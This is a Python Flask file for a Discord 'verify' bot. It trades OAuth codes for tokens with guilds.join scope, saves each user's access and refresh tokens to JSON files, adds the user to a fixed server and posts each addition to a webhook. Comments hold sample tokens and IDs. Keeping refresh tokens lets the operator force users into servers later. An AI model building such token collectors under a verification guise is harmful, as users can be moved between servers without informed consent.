# https://canary.discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.risinplayz1337.repl.co&response_type=code&scope=identify%20guilds.join

import os
import json, requests
from flask import Flask, redirect, url_for, request
app = Flask(__name__)

# @app.route('/')
# def hello_world():
#     return 'unauthorized'
# import discord
import requests
import  json
# from discord import *
# from discord.ext import commands

hook = os.environ["hook"]
tkn = os.environ["tkn"]
API_ENDPOINT = 'https://canary.discord.com/api/v9'
CLIENT_ID = '994684314010796083'
CLIENT_SECRET = os.environ['c_s']
REDIRECT_URI = 'https://verify.risinplayz1337.repl.co' #You can use any redirection url (make sure to mentpion the same in the dev portal)

def exchange_code(code):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': REDIRECT_URI
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = requests.post(str(API_ENDPOINT) + '/oauth2/token' , data=data, headers=headers)
  # print(r.json())
  return r.json()

def add_to_guild(access_token, userID , guild_Id ):
        url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"

        botToken = tkn
        data = {
        "access_token" : access_token,
    }
        headers = {
        "Authorization" : f"Bot {botToken}",
        'Content-Type': 'application/json'

    }
        response = requests.put(url=url, headers=headers, json=data)
        r = requests.post(hook, json={ "content": f"successfully added user <@{userID}> | {userID}"})
        # print(response.text)
        # print(response.status_code)
        # print(REDIRECT_URI)

def get_user(access:str):
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={ "Authorization": f"Bearer {access}" })
  rjson = r.json()
  return rjson['id']
  


# code = exchange_code('gvxPfY7M80idbUgN6YfwJPUIEuP2kv')['access_token']
# add_to_guild(access_token="9csiMPR9reOxjDJCxEc1z7oZJwNiUm", userID="661563598711291904" , guild_Id="1028633555972145183")
# @app.route('/')
# def main():
#   return redirect("https://discord.com/invite/spy", code=302)

# def handler(code: str):
  
def test():
  print("works")
    
@app.route('/')
def process_json():
  # test()
  # redirect("https://discord.com/invite/spy", code=302)
  args = request.args
  idk = args.getlist('code')
  idk = str(idk)
  idk = idk.replace("[", "")
  idk = idk.replace("]", "")
  idk = idk.replace("'", "")
  # print(idk)
  # handler(idk)
  try:
    # print("testing")
    exchange = exchange_code(idk)
    # print(exchange)
    access_tk = exchange['access_token']
    # print(access_tk)
    refresh_tk = exchange['refresh_token']
    # print(refresh_tk)
    id = get_user(access_tk)
    # print(id)
    with open('Database/access_tokens.json', 'r') as f:
      db1 = json.load(f)
      db1[str(id)] = str(access_tk)
      with open('Database/access_tokens.json', 'w') as f:
        json.dump(db1, f, indent=2)
    with open('Database/refresh_tokens.json', 'r') as f:
      db2 = json.load(f)
      db2[str(id)] = str(refresh_tk)
      with open('Database/refresh_tokens.json', 'w') as f:
        json.dump(db2, f, indent=2)
    add_to_guild(str(access_tk), str(id), "952495772073619466")
  except:
    pass
  return redirect("https://discord.com/oauth2/authorized", code=302)
  # content_type = request.headers.get('Content-Type')
  # if (content_type == 'application/json'):
  # json = request.json
  # # return 200
  # print(json)
  # print(request.headers)
  # user = json["user"]
  # guild = json["guild"]
  # verify(user)
  
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)